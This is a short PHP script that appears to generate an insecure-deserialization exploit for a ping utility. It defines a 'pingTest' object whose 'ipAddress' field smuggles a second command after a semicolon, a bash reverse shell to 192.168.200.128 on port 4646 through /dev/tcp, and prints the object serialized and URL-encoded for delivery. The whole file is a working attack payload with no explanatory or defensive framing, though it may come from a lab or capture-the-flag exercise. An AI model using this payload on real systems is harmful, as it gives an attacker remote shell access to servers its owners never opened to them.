<?php

class pingTest {
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.200.128/4646 0>&1'";
	public $isValid = True;
	public $output = "";
}

echo urlencode(serialize(new pingTest));
//echo serialize(new pingTest);
?>
